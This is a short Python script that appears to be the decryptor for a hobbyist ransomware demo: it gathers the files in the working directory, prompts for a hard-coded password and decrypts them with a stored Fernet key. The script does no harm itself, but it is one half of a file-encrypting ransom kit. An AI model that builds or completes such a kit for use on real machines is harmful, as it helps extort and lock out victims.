import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "vairus.py" or file == "thekey.key" or file == "decryptor.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

password = "robin"

user_pass = input("Enter the password to decrpt your files\n")
if user_pass == password:
    for file in files:
        with open(file, "rb") as thefile:
            content = thefile.read()
        decrypted_content = Fernet(secretkey).decrypt(content)
        with open(file, "wb") as thefile:
            thefile.write(decrypted_content)
    print("Congratulations your files has been decrypted!")
else:
    print("Wrong Password!! Nice Try!")